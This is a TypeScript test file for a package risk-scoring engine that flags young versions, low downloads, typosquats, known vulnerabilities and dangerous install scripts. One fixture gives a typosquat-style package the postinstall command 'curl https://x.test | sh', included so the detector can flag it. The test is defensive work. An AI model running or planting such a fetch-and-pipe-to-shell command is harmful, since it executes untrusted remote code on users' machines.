import { describe, expect, it } from "vitest";
import { evaluatePackageRisk } from "../src/risk-engine.js";
import type { PackageMetadata } from "../src/types.js";

function meta(partial: Partial<PackageMetadata> & Pick<PackageMetadata, "name" | "version">): PackageMetadata {
  return {
    publishedAt: null,
    maintainersCount: 2,
    scripts: {},
    weeklyDownloads: 10_000,
    ...partial,
  };
}

describe("evaluatePackageRisk", () => {
  it("high score for mature package without risky scripts", () => {
    const r = evaluatePackageRisk(
      meta({
        name: "safe-pkg",
        version: "1.0.0",
        publishedAt: new Date(Date.now() - 120 * 24 * 60 * 60 * 1000),
        weeklyDownloads: 50_000,
        maintainersCount: 3,
      }),
      { trusted: false },
    );
    expect(r.score).toBeGreaterThanOrEqual(85);
    expect(r.flags.filter((f) => f.severity === "high")).toHaveLength(0);
  });

  it("penalizes very new version and low downloads", () => {
    const r = evaluatePackageRisk(
      meta({
        name: "fresh-risky",
        version: "0.0.1",
        publishedAt: new Date(Date.now() - 2 * 24 * 60 * 60 * 1000),
        weeklyDownloads: 10,
        maintainersCount: 1,
      }),
      { trusted: false },
    );
    expect(r.score).toBeLessThan(70);
    expect(r.flags.some((f) => f.id === "young-version")).toBe(true);
    expect(r.flags.some((f) => f.id === "low-downloads")).toBe(true);
  });

  it("trusted skips metadata/typosquat but still flags dangerous scripts", () => {
    const r = evaluatePackageRisk(
      meta({
        name: "lodas",
        version: "1.0.0",
        publishedAt: new Date(),
        weeklyDownloads: 0,
        scripts: { postinstall: "curl https://x.test | sh" },
      }),
      { trusted: true },
    );
    expect(r.flags.some((f) => f.id === "typosquatting")).toBe(false);
    expect(r.flags.some((f) => f.id === "script-pipe-shell")).toBe(true);
  });

  it("trusted still applies OSV signal", () => {
    const r = evaluatePackageRisk(
      meta({
        name: "x",
        version: "1.0.0",
        osvVulns: [{ id: "GHSA-example" }],
      }),
      { trusted: true },
    );
    expect(r.flags.some((f) => f.id === "osv-known-vulnerability")).toBe(true);
  });

  it("private packages get info flag and no score penalty", () => {
    const r = evaluatePackageRisk(
      meta({ name: "@mycompany/utils", version: "1.0.0", isPrivate: true }),
      { trusted: false },
    );
    expect(r.score).toBe(100);
    expect(r.flags.some((f) => f.id === "private-package")).toBe(true);
    expect(r.flags.find((f) => f.id === "private-package")?.severity).toBe("info");
    expect(r.flags.some((f) => f.id === "fetch-error")).toBe(false);
  });

  it("reduces young-version penalty when weekly downloads are high", () => {
    const highDl = evaluatePackageRisk(
      meta({
        name: "pkg",
        version: "1.0.0",
        publishedAt: new Date(Date.now() - 3 * 24 * 60 * 60 * 1000),
        weeklyDownloads: 20_000,
        maintainersCount: 2,
      }),
      { trusted: false },
    );
    const lowDl = evaluatePackageRisk(
      meta({
        name: "pkg",
        version: "1.0.0",
        publishedAt: new Date(Date.now() - 3 * 24 * 60 * 60 * 1000),
        weeklyDownloads: 50,
        maintainersCount: 2,
      }),
      { trusted: false },
    );
    expect(highDl.score).toBeGreaterThan(lowDl.score);
  });
});
